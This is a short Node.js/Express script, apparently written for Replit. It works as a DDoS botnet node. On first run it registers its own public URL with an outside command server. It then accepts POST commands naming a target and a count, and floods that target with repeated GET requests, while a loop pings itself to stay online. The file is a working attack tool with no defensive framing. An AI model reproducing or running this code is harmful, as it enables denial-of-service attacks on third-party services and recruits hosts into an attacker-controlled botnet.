const fs = require('fs')
const express = require('express')
const app = express()
const bodyParser = require('body-parser')
const axios = require('axios')
var remainding = 500
function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}
if (!fs.existsSync('ok.js')) {
  axios.request({
    url: `https://sillyimportantmemorypool.hackballshd.repl.co/register`,
    method: 'PUT',
    data: {
      ip: `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`
    }
  })
  fs.writeFileSync('ok.js', '//ok')
}

app.use(bodyParser.json())

app.post('/send', (req, res) => {
  res.status(200).json({
    message: 'OK'
  })
  console.log("RECIEVED CMD")
  console.log(req.body.count)
  for (i = 0; i < req.body.count; i++) {
    send(req.body.target, 500)
    console.log("iteration : "+i+" out of "+req.body.count)
  }
})



app.get('/', (req, res) => {
   console.log("poggers but epic")
  res.send('poggers')
})

app.listen(4000)

function send(target, remain) {
  if (remain > 0) {
    remain = remain - 1
    console.log('sent ' + (500 - remain) + ' requests to target')
    axios.request({
      url: target,
      method: 'GET'
    }).then(r => {
      send(target, remain)
    })
  }
}

console.clear()

console.log('ready')




const main = new Promise(async (resolve)=>{	
  const i = 0
     while (i < 10) {	
  await sleep(2000)	

  await axios.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/`)	
  .then(function (response) {	
    console.log(response.data);	
  })
  .catch((err)=>{console.log("what")})
     }	

     })
